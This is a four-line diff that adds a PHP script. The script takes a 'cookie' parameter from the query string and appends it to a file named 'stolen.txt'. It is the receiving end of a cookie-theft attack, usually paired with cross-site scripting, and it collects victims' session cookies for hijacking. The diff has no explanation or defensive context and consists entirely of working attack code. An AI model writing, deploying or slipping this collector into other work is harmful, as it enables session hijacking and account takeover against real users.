@@ -1,0 +1,4 @@
+<?php
+$log = $_GET['cookie'] . "\n";
+file_put_contents("stolen.txt", $log, FILE_APPEND);
+?>
